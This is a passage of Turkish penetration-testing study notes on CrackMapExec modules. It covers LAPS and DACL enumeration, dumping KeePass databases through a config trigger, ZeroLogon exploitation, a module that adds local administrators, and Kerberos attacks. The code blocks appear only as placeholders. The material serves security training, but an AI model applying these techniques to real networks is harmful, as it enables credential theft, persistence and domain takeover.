Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

